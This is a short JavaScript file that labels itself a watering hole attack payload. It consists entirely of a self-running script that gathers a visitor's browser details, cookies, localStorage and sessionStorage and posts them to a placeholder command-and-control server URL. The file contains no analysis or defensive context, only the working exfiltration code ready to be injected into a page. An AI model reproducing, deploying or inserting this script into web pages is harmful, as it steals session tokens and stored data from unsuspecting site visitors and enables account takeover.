// JavaScript payload for a watering hole attack.
// This script profiles the victim's browser and sends the information to a C2 server.

(function() {
    var c2_url = "http://your-c2-server.com/profiler";
    var profile = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage)
    };

    // Send the profile data to the C2 server
    var xhr = new XMLHttpRequest();
    xhr.open("POST", c2_url, true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.send(JSON.stringify(profile));
})();
